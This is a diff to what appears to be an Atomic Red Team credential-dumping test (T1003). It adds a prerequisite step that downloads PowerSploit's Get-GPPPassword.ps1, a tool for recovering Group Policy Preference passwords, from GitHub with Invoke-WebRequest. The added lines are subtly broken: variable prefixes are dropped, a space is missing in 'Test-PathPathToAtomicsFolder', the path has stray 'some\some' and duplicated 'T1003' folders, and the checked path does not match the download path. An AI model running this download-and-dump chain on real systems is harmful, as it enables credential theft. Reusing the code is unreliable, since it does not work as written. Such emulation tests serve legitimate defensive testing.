@@ -270,7 +270,20 @@ atomic_tests:
     gpp_script_path:
       description: Path to the Get-GPPPassword PowerShell Script
       type: Path
-      default: $PathToAtomicsFolder\T1003\src\Get-GPPPassword.ps1
+      default: PathToAtomicsFolder\T1003\src\some\some\Get-GPPPassword.ps1
+    gpp_script_url:
+      description: URL of the Get-GPPPassword PowerShell Script
+      type: URL
+      default: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1
+
+  dependency_executor_name: powershell 
+  dependencies: # (optional)
+    - description: |
+        Get-GPPPassword PowerShell Script must exist at #{gpp_script_path}
+      prereq_command: | 
+        if(Test-PathPathToAtomicsFolder\T1003\T1003\src\Get-GPPPassword.ps1) { 0 } else { 1 }
+      get_prereq_command: | 
+        Invoke-WebRequest #{gpp_script_url} -OutFile #{gpp_script_path}
 
   executor:
     name: powershell
